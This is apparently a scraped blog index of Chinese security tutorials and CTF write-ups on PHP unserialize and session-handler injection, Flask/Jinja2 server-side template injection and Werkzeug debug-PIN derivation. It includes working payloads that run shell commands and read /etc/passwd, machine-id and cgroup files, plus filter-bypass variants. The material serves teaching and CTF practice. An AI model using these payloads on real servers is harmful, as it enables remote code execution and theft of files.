'phpinfo();'; } function __destruct() { eval($this->mdzz); } } if(isset($_GET['phpinfo'])) { $m = new OowoO(); } else { highlight_string(file_get_contents('index.php')); } ?> phpinfo.php &lt;?php session_start(); phpinfo(); ?> (2) 题目分析 请求链接发现首页源码，根据源码传入phpinfo任意参数，执行phpinfo()，得到配置信息如下： 根据以上信息发现是典型的利用了上传这个点传入session数据的； 并且通过扫描发现存在phpinfo.php这个页面，请求发现这个页面使用的是默认的php_serialize解析器 根据两页面使用的解析器不同特征，可以达成任意的反序列化利用 (3) 漏洞利用 构造上传表单 &lt;form action=\"http://192.168.1.191:32768/index.php\" method=\"POST\" enctype=\"multipart/form-data\"> &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /> &lt;input type=\"file\" name=\"file\" /> &lt;input type=\"submit\" /> &lt;/form> 构造目录文件扫描序列化代码 &lt;?php class OowoO { public $mdzz; function __construct() { $this->mdzz = \"print_r(scandir(dirname(__FILE__)));\"; } } $obj = new OowoO(); echo serialize($obj); // ?> O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";} 抓取上传包，修改filename带入序列化的值 构造读取flag序列化代码 &lt;?php class OowoO { public $mdzz; function __construct() { $this->mdzz = \"include(\\\"php://filter/read=convert.base64-encode/resource=MDZZ_you_see_The_FlAg.php\\\");\"; } } $obj = new OowoO(); echo serialize($obj); // ?> O:5:\"OowoO\":1:{s:4:\"mdzz\";s:86:\"include(\"php://filter/read=convert.base64-encode/resource=MDZZ_you_see_The_FlAg.php\");\";} 获得flag","link":"/2019/05/16/web-security/php-code-audit/php-unserialzie-session/"},{"title":"php反序列化漏洞解析","text":"PHP反序列化漏洞序列化与反序列化PHP的序列化php序列化就是将各种类型的数据，压缩并按照一定的格式进行存储的过程。其本质就是将对象数据类型转换成字符串的数据类型，方便于对象的传递。 函数:serialize() 代码实例: &lt;?php class SerializeDemo { public $a = \"public\"; private $b = \"private\"; protected $c = \"protected\"; public function get_public() { echo $this->a; } } $data = new SerializeDemo(); echo serialize($data); ?> 输出结果： 结果分析： O：代表这是一个对象 13：代表对象名称占13个字符 SerializeDemo：代表对象名称 3：代表对象有3个属性 s:代表属性的类型str 1：代表属性名称长度为1字符 a：代表属性名称 s：代表属性值类型为str 6：代表属性值占6个字符 public：代表属性值 注：根据结果我们可以发现这里面的三个属性的标识结果均不相同，这是为什么呢？ PHP序列化中的权限根据上述实例我们发现，属性b在序列化之后变成了SerializeDemob,长度也与真实字符数量不一致；并且属性c也不相同，前面多了一个*。发生此种现象的原因主要是由于成员变量属性的属性不同所导致的。序列化为了能把整个类对象的各种信息完完整整的压缩、格式化，必须也要对其属性的权限进行序列化。针对于此种情况，我们具体来看一下public、private、protected三种属性的具体表现情况： public 该权限序列化时，该是几个字符就是几个字符 private 该权限是私有属性，私有权限的特征是该类对其私有属性具有强烈占有欲，所以会在其私有属性前增加自己的类名;多出来的两个字符为空白符，也就是%00，最终的表现形式为：%00类名%00属性名 protected 该属性为受保护权限，序列化时的变现形式为：%00*%00属性名 PHP序列化的内容根据前面序列化的实例我们发现，整个序列化的过程中，只会对其类的属性内容进行序列化保存，不会对其方法进行序列化。 在反序列化的时候一定要保证在当前的作用域环境下有该类存在; 反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。 在反序列化攻击的时候也就是依托类属性进行攻击; 因为没有序列化方法，能控制的只有类的属性，因此类属性就是唯一的攻击入口。在的攻击流程中，就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的反序列化攻击。 PHP的反序列化反序列化就是将原本序列化之后的字符串格式还原成的初始对象的过程；使对象数据长久保存，可以在随时想调用的时候就可以调用。 函数:unserialize() 代码实例: &lt;?php class SerializeDemo { public $a = \"public\"; private $b = \"private\"; protected $c = \"protected\"; public function get_public() { echo $this->a; } } $data = file_get_contents(\"serialize.txt\"); $data = unserialize($data); $data->get_public(); ?> serialize.txt O:13:\"SerializeDemo\":3:{s:1:\"a\";s:6:\"public\";s:16:\"%00Serialize%00Demob\";s:7:\"private\";s:4:\"%00*%00c\";s:9:\"protected\";} 结果输出 反序列化漏洞概念PHP 反序列化漏洞又叫做 PHP 对象注入漏洞。 反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。 魔法函数常见的魔法函数 __construct() 当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。 __destruct() 当对象被销毁时会自动调用。 __toString() 当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用。 (1)echo ($obj) / print($obj) 打印时会触发 (2)反序列化对象与字符串连接时 (3)反序列化对象参与格式化字符串时 (4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） (5)反序列化对象参与格式化SQL语句，绑定参数时 (6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 (7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 (8)反序列化的对象作为 class_exists() 的参数的时候 __wakeup() 当一个对象被反序列时会被自动调用。 __sleep() 对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。 __invoke() 当一个实例化对象被当成一个方法调用时会自动触发此方法。 __call() 在一个对象中，当一个调用的方法不能访问时，会自动触发。 2.2.8 __get() 当调用一个不可访问的属性时会自动调用。 利用魔法函数的攻击实例(magic_function)案例代码 &lt;?php class Greetdawn { private $test; public $Greetdawn = \"i am Greetdawn\"; function __construct() { $this->test = new L(); } function __destruct() { $this->test->action(); } } class L { function action() { echo \"Welcome to Sec World\"; } } class Evil { var $test2; function action() { eval($this->test2); } } if(isset($_GET['test'])){ unserialize($_GET['test']); } else { $obj = new Greetdawn(); highlight_file(__FILE__); } ?> 代码分析 首先发现有三个类，主类为Greetdawn，且该类中有__construct()、__destruct()两个魔法函数； 实例化Greetdawn类的时候，会先触发__construct()方法，实例化一个L类并赋值给变量test； L类中含有action方法且输出一句话； 我们发现在L类下方还存在一个Evil的类也同样存在一个action方法，但是该方法中是调用一个eval的危险函数； 那这边强制将__construct()方法中实例化的类改为Evil类即可达成利用； exp &lt;?php class Greetdawn { private $test; function __construct() { $this->test = new Evil(); } } class Evil { var $test2 = \"phpinfo();\"; } $data = new Greetdawn(); echo urlencode(serialize($data)); ?> O%3A9%3A%22Greetdawn%22%3A1%3A%7Bs%3A15%3A%22%00Greetdawn%00test%22%3BO%3A4%3A%22Evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D 反序列化攻击流程(1)寻找unserialize()函数的参数是否有我们的可控点(2)寻找我们的反序列化的目标，重点寻找 存在 wakeup() 或 destruct() 魔法函数的类(3)一层一层地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的(4)找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击 __wakeup函数绕过漏洞源码&lt;?php class SoFun{ protected $file='index.php'; function __destruct(){ if(!empty($this->file)) { if(strchr($this-> file,\"\\\\\")===false &amp;&amp; strchr($this->file, '/')===false) show_source(dirname (__FILE__).'/'.$this ->file); else die('Wrong filename.'); } } function __wakeup(){ $this-> file='index.php'; } public function __toString(){ return '' ; } } if (!isset($_GET['file'])){ show_source('index.php'); } else{ $file=base64_decode($_GET['file']); echo unserialize($file); } ?> #&lt;!--key in flag.php--> 审计思路 源码最后提示，KEY在flag.php里面； 注意到__destruct魔术方法中，有这么一段代码，将file文件内容显示出来 show_source(dirname(FILE).’/‘.$this-&gt;file)，这个是解题关键； 若POST“file”参数为序列化对象，且将file设为flag.php；那么可以通过unserialize反序列化，进而调用destruct魔术方法来显示flag.php源码（要注意的是file参数内容需要经过base64编码）； 但是通过unserialize反序列化之后，也会调用__wakeup方法，它会把file设为index.php; 总结下来就是，想办法把file设为flag.php，调用__destruct方法，且绕过__wakeup。 __wakeup绕过特性绕过wakeup的限制：当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行。 php版本限制：PHP5 &lt; 5.6.25 | PHP7 &lt; 7.0.10 file是protected属性，因此需要用\\00*\\00来表示，\\00代表ascii为0的值payload 漏洞利用因php版本原因未复现可以简单的使用phpstudy来复现比较快捷； &lt;?php class SoFun{ protected $file = 'flag.php'; } $object = new SoFun(); $data = serialize($object); echo $data; echo base64_encode($data);","link":"/2019/05/14/web-security/php-code-audit/php-unserialize-vul/"},{"title":"python模板注入漏洞始末（SSTI）","text":"ssti基础ssti的定义SSTI(Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的。 模板引擎 模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离 模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段 后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成 前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成 jinja2Jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。 在Jinja2中，存在三种语句： 控制结构 {% %} 变量取值 {{ }} 注释 {# #} render_template()具体渲染流程如下： render_template()函数的第一个参数为渲染的目标html页面、第二个参数为需要加载到页面指定标签位置的内容 注：当在HTML模板中在标签内传入的内容是通过如name=value而非%s这种传参形式时，HTML自动转义默认开启。 测试demo app.py 源码 from flask import Flask from flask import request, render_template_string, render_template app = Flask(__name__) @app.route('/login') def hello_ssti(): person = { 'name': 'hello', 'secret': 'This_is_my_secret' } if request.args.get('name'): person['name'] = request.args.get('name') return render_template(\"index.html\", person=person) if __name__ == \"__main__\": app.run(debug=True) 然后在templates目录新建index.html &lt;h2>Hello {{ person.name }}!&lt;/h2> 请求传入参数name，页面直接回显结果 传入xss代码，直接被转义 render_template_string()这个函数作用和前面的类似，区别在于只是第一个参数并非是文件名而是字符串。也就是说，我们不需要再在templates目录中新建HTML文件了，而是可以直接将HTML代码写到一个字符串中，然后使用该函数渲染该字符串中的HTML代码到页面即可。 测试demo from flask import Flask from flask import request, render_template_string, render_template app = Flask(__name__) @app.route('/login') def hello_ssti(): person = { 'name': 'hello', 'secret': 'This_is_my_secret' } if request.args.get('name'): person['name'] = request.args.get('name') template = '&lt;h2>Hello {{ person.name }}!&lt;/h2>' return render_template_string(template, person=person) if __name__ == \"__main__\": app.run(debug=True) ssti漏洞成因组件版本 Flask 0.12.1 Werkzeug 0.14.1 漏洞代码from flask import Flask from flask import render_template from flask import request from flask import render_template_string app = Flask(__name__) @app.route('/test',methods=['GET', 'POST']) def test(): template = ''' &lt;div class=\"center-content error\"> &lt;h1>Oops! That page doesn't exist.&lt;/h1> &lt;h3>%s&lt;/h3> &lt;/div> ''' %(request.url) print(request.url) return render_template_string(template) if __name__ == '__main__': app.debug = True app.run() 分析利用我们可以发现此时的代码传参已经更换成%s的方式传入，并且调用了render_template_string函数 传入参数/test?{{10+10}} 我们发现返回值变成求和的结果值，传入的恶意代码被解析执行了 漏洞利用步骤python中的魔法函数__class__ 返回类型所属的对象（类） __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __base__ 返回该对象所继承的基类 // __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的引用的列表 __init__ 类的初始化方法 __globals__ 对包含函数全局变量的字典的引用 payload的构造思路大致思路:找到父类&lt;type 'object'&gt;–&gt;寻找子类(可能存在对文件操作的类file)–&gt;找关于命令执行或者文件操作的模块 {{''.__class__}} 获取字符串的类对象 {{''.__class__.__mro__}} 获取对应类的基类 {{''.__class__.__mro__[1].__subclasses__()}} 获取对应类的基类 此时我们需要使用脚本寻找可以被利用的子类，这边寻找os._wrap_close #!/usr/local/env python3 import requests url = \"http://127.0.0.1:5000/test?\" payload = \"{{{{ ''.__class__.__mro__[1].__subclasses__()[{number}] }}}}\" for i in range(300): temp = url + payload.format(number = i) #print(temp) res = requests.get(url = temp, timeout = 5) print(\"[-] INFO : 开始查找 %d\" %i) #print(res.text) # warnings.catch_warnings wrap_close file if 'os._wrap_close' in res.text: print(\"[+] INFO :找到pyaload: %s\" %temp) 成功搜索到对应命令执行类的编号为128 {{''.__class__.__mro__[1].__subclasses__()[128]}} 成功获取到对应的类 {{''.__class__.__mro__[1].__subclasses__()[128].__init__}} 初始化类方法 {{''.__class__.__mro__[1].__subclasses__()[128].__init__}} 初始化类方法 {{''.__class__.__mro__[1].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']}} 调用eval危险函数 {{''.__class__.__mro__[1].__subclasses__()[128].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('whoami').read()\")}}执行命令 常用payload汇总获得基类 python2.7 ''.__class__.__mro__[2] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[1] python3.7 ''.__class__.__mro__[1] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[1] python 2.7 文件操作 [].__class__.__bases__[0].__subclasses__()[40] [].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read() [].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test') 命令执行 [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read() [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__ [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\") [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\") [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read() [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() python3.7 命令执行 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %} 文件操作 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %} windows下的os命令 \"\".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read() 其他漏洞利用XSS插入什么返回什么，说明必定可以xss,&lt;script&gt;alert('xss')&lt;/script&gt; 敏感信息的泄露{{config}} 访问对应的全局变量即可直接泄露出配置文件的内容。 真题复现flask_delicious这是一套ctf真题复现 首先请求，发现是一个炫酷demo界面，一般这种界面没啥好审计的 那么直接F12进行信息收集，发现存在python3.5.2的环境，并且没有静态服务器 猜测是一个python的站，点击其他的demo测试页 发现这是一个flask的404页面，那么直接联想到的是ssti注入 {{4+4}} 发现确实存在ssti 这种一般可能会存在过滤，可以简单fuzz一下{{payload}} 大概过滤了如下的一些内容config、class、mro、args、request、open、eval、builtins、import等 基本把我们常用的ssti关键字都给过滤了 经过查阅flask官方文档，找到还有session对象可以使用，并且未被过滤；并且session是一个字典对象，因此我们可以通过键的方法访问相应的类，且键是字符串格式，字符串我们可以使用拼接绕过 payload:{{session['__cla'+'ss__']}} 访问到了该类之后，可以通过__base__来获取基类的元组，一直向上去获取到object的基类 payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__}} 通过__subclasses_获取基类中所有的子类 payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()}} 使用脚本找到可以命令执行的子类 #!/usr/local/env python3 import requests url = \"http://192.168.1.191:19008/\" payload = \"{{{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[{number}]}}}}\" for i in range(300): temp = url + payload.format(number = i) #print(temp) res = requests.get(url = temp, timeout = 5) print(\"[-] INFO : 开始查找 %d\" %i) #print(res.text) # warnings.catch_warnings wrap_close file if 'os._wrap_close' in res.text: print(\"[+] INFO : 找到 pyaload: %s\" %temp) payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[293]}} 获取当前子类的所有内建方法 payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[293].__init__.__globals__}} 调用popen命令执行获取flag paylaod:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[293].__init__.__globals__['pop'+'en']('cat /Th1s__is_S3cret'').read()}} flask_plus这道题其实是上一题的姊妹题，内容都是差不多了，只不过在过滤上又多做了一些手脚 直接拿原来的payload的尝试,发现一直到获取子类os.__warp_close都是ok的 payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[72]}} 但是此时出现问题了,到我们再次使用__init__实例化方法时，发现被过滤了 payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[72].__init__}} 到这里岂不是我们的路就被切死了么？不会，继续查阅资料,进行本地测试 我们发现该子类中还存在__enter__属性，经测试发现该属性存在可以调用__globals__ payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[72].__enter__.__globals__}} 可以成功访问方法，那么直接构造最终拿flag的payload payload:{{session['__cla'+'ss__'].__base__.__base__.__base__.__base__['__subcl'+'asses__']()[72].__enter__.__globals__['pop'+'en']('cat /Th1s_is__F1114g').read()}} Flask PIN码PIN码机制Flask应用在debug模式下提供了一种页面端的交互调试工具，和平时使用python交互式命令终端是一样的。在旧版本的flask中是不需要输入PIN码直接执行代码的。在新版本的flask中需要输入PIN进行认证，才能执行自定义的代码，相当于在进入终端前设置了一个密码的限制。但是PIN有这样的一个机制，在同一台机器上，多次重启flask服务，PIN码的值是一个固定值，这就让代码的利用再次成为了一种可能。 PIN码的生成机制PIN的的生成需要特定的六个元素即可： 服务器运行Flask所登陆的用户名username（root或其他） modname,一般为flask.app Flask # getattr(app, '__name__', getattr(app.__class__, '__name__')) flask库下的app.py绝对路径，可由debug页面获得 当前网络的mac地址的十进制数. mac地址在linux系统里的 /sys/class/net/eth0/address 机器的ID， linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件 ，如果是docker机器，则在 /proc/self/cgroup PIN码生成脚本import hashlib from itertools import chain probably_public_bits = [ 'flaskweb', #username 'flask.app', #modname 'Flask', #getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py', #app.py的绝对路径 ] private_bits = [ '2485410391036', #mac地址的十进制数 '25f34b1b3cf9815ee85b0089a6203547ca22efbdbbc16f0c39d70fb528f773a1' #机器ID ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) 真题复现BUUCTF: [CISCN2019 华东南赛区]Double Secret 请求页面获取到一句话Welcome To Find Secret 猜测到存在secret目录，或者使用目录扫描也可以发现 直接请求secret，获取到一句话Tell me your secret.I will encrypt it so others can't see 可以传参secret=1，获取到字母d 再次传参到位数超过5位时，就返回flask debug错误返回页 并且通过错误页面，获取到关键错误函数如下 我们发现传入的值在这里经过一次RC4加密处理 这里RC4是一种对称加密算法，加密特点是明文加密一次得到密文，再加密一次得到明文；我们前面尝试输入1返回的是字母d，我们在尝试输入d，我们发现返回1 根据这种特点可以尝试自己编写脚本，或者使用在线的解密工具均可，这里使用解密脚本： import base64 from urllib.parse import quote def rc4_main(key = \"init_key\", message = \"init_message\"): # print(\"RC4加密主函数\") s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return crypt def rc4_init_sbox(key): s_box = list(range(256)) # print(\"原来的 s 盒：%s\" % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\"混乱后的 s 盒：%s\"% s_box) return s_box def rc4_excrypt(plain, box): # print(\"调用加密程序成功。\") res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = \"\".join(res) print(\"加密后的字符串是：%s\" %quote(cipher)) return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) rc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()}}\") 解法一：SSTI payload:{{config}} –rc4–&gt; .%14ZZ%C2%A4%01%02iv%C2%80 发现被正常执行了，说明存在ssti，根据已知信息收集，知道目标服务器使用的是python2.7直接调用该payload命令执行 payload:{{{{[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}}} –rc4–&gt; .%14bh%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%91U%27%C2%B2A%C3%9FM1%C3%81%05%C3%87m%C3%B3%21 %C3%B2/%C2%88A%C3%97%1B%C3%A2-%C3%B7D%C3%A5%C3%85%C2%ABV%5B%C3%A4%27%C3%AB%C2%82yel%C3%A2%3ES%C2%A8qw%C3%BB%C2%BEF%1E%C3%B7%C2%95%15%C2%A9v%05%7Fp%C3%96p%C3%99%2C%C3%A9p%C2%87aW-%09z%C3%88%C3%AB%60%C3%BF%C2%89%C2%99%C3%8E%C3%A3%C2%91%C3%A92%5C%C2%A7%C2%B8%C3%B5%C2%8A%C2%A7%3DI%C3%B4%C3%83%1C%C3%8A2%5B%0A%C3%90%C2%8B%02p%2CH%22%C2%95%C2%A6%C2%89%27~%C2%A8kJ%08%C3%8C payload:{{{{[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag.txt').read()}}}} –rc4–&gt; .%14bh%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%91U%27%C2%B2A%C3%9FM1%C3%81%05%C3%87m%C3%B3%21 %C3%B2/%C2%88A%C3%97%1B%C3%A2-%C3%B7D%C3%A5%C3%85%C2%ABV%5B%C3%A4%27%C3%AB%C2%82yel%C3%A2%3ES%C2%A8qw%C3%BB%C2%BEF%1E%C3%B7%C2%95%15%C2%A9v%05%7Fp%C3%96p%C3%99%2C%C3%A9p%C2%87aW-%09z%C3%88%C3%AB%60%C3%BF%C2%89%C2%99%C3%8E%C3%A3%C2%91%C3%A92%5C%C2%A7%C2%B8%C3%B5%C2%8A%C2%A7%3DI%C3%B4%C3%83%1C%C3%8A2%5B%0A%C3%90%C2%8B%02p%26Mq%C2%9C%C2%A7%C2%9D.~%C2%ABm%17%0D%C3%85%27%C3%99G%C2%90%C2%9D%C3%BE/%C2%B6%C3%AAHt 解法二：PIN码 username:glzjin modename:flask.app getattr(app, '__name__', getattr(app.__class__, '__name__')): Flask app path:/usr/local/lib/python2.7/site-packages/flask/app.pyc 获取str(uuid.getnode()) 02:42:ac:10:9d:88 –&gt; 2485377867144 payload:{{[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /sys/class/net/eth0/address').read()}} –rc4–&gt; .%14bh%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%91U%27%C2%B2A%C3%9FM1%C3%81%05%C3%87m%C3%B3%21 %C3%B2/%C2%88A%C3%97%1B%C3%A2-%C3%B7D%C3%A5%C3%85%C2%ABV%5B%C3%A4%27%C3%AB%C2%82yel%C3%A2%3ES%C2%A8qw%C3%BB%C2%BEF%1E%C3%B7%C2%95%15%C2%A9v%05%7Fp%C3%96p%C3%99%2C%C3%A9p%C2%87aW-%09z%C3%88%C3%AB%60%C3%BF%C2%89%C2%99%C3%8E%C3%A3%C2%91%C3%A92%5C%C2%A7%C2%B8%C3%B5%C2%8A%C2%A7%3DI%C3%B4%C3%83%1C%C3%8A2%5B%0A%C3%90%C2%8B%02p%26Mq%C2%9C%C2%A7%C2%88%3Bl%C3%A3%20%0F%14%C3%82s%C3%9F%07%C2%87%C2%8C%C2%B0.%C3%AA%C2%AB%05%26%C3%AB%C3%9B%2B%C2%91i%5E%40~%C2%93%C3%81%C2%B4%C2%AD%C3%B8%C2%8Cv%1E%2Cs 获取machine_id ee17edd855b51ea282681156d5459c250943922600b4b8294e17deae3607e137 payload:{{[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /proc/self/cgroup').read()}} –rc4–&gt; .%14bh%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%91U%27%C2%B2A%C3%9FM1%C3%81%05%C3%87m%C3%B3%21 %C3%B2/%C2%88A%C3%97%1B%C3%A2-%C3%B7D%C3%A5%C3%85%C2%ABV%5B%C3%A4%27%C3%AB%C2%82yel%C3%A2%3ES%C2%A8qw%C3%BB%C2%BEF%1E%C3%B7%C2%95%15%C2%A9v%05%7Fp%C3%96p%C3%99%2C%C3%A9p%C2%87aW-%09z%C3%88%C3%AB%60%C3%BF%C2%89%C2%99%C3%8E%C3%A3%C2%91%C3%A92%5C%C2%A7%C2%B8%C3%B5%C2%8A%C2%A7%3DI%C3%B4%C3%83%1C%C3%8A2%5B%0A%C3%90%C2%8B%02p%26Mq%C2%9C%C2%A7%C2%8B0p%C2%AFl%10%10%C3%9Df%C3%9F%0A%C2%85%C2%8A%C3%B0%3E%C3%AE%C3%A4%1C%27%C3%B8%C3%9A.%C2%87%24%04N%24 获取六个元素后,直接利用PIN脚本获取pin码 252-519-893 直接键入PIN码获取交互console，执行命令即可 常见的沙箱逃逸过滤中括号pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。 ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read() 在这里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过 过滤引号request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤 {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd 过滤双下划线同样利用request.args属性 {{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 将其中的request.args改为request.values则利用post的方式进行传参 GET: {{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() }} POST: class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 过滤关键字base64编码绕过__getattribute__使用实例访问属性时,调用该方法 例如被过滤掉__class__关键词 {{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()}} 字符串拼接绕过 {{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()}} 同时绕过下划线、与中括号{{()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')|attr(request.values.name5)()}} post: name1=__class__&amp;name2=__base__&amp;name3=__subclasses__&amp;name4=pop&amp;name5=read 绕过.过滤若.也被过滤，使用原生JinJa2函数|attr()将request.__class__改成request|attr(&quot;__class__&quot;)","link":"/2021/02/06/web-security/python-code-audit/python-ssti/"},{"title":"python序列化与反序列化","text":"基础知识序列化与反序列化流程Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。 序列化与反序列化概念在程序运行的过程中，所有的变量存储的数据都是加载在内存中，一旦程序结束，数据所占用的内存就被操作系统全部回收。各种类型的数据从内存中变成可存储或传输的过程称之为序列化，序列化之后，就可以把序列化后的内容写入磁盘，或者通过网络传输到别的机器上。反过来，把数据内容从序列化的对象重新读到内存里称之为反序列化。 序列化的目的 以某种存储形式使自定义对象持久化； 将对象可以从一个地方传递到另一个地方； 使程序更具有维护性。 python中序列化模块 pickle pickle是python中内建的序列化和反序列化模块，且以二进制的方式进行序列化数据存储，pickle序列化的内容只能使用python才能操作，且反序列化依赖代码。 json json是一种轻量级的数据交换格式，是一种通用的序列化格式，具有更好的可读性和跨平台性。 shelve 模块是 Python3 新出现的方式，特点是操作简单，使用序列化句柄直接操作，非常方便。缺点是目前不太常用。 yaml YAML是一种直观的能够被电脑识别的的数据序列化格式，容易被人类阅读，并且容易和脚本语言交互，YAML类似于XML，但是语法比XML简单得多，对于转化成数组或可以hash的数据时是很简单有效的。 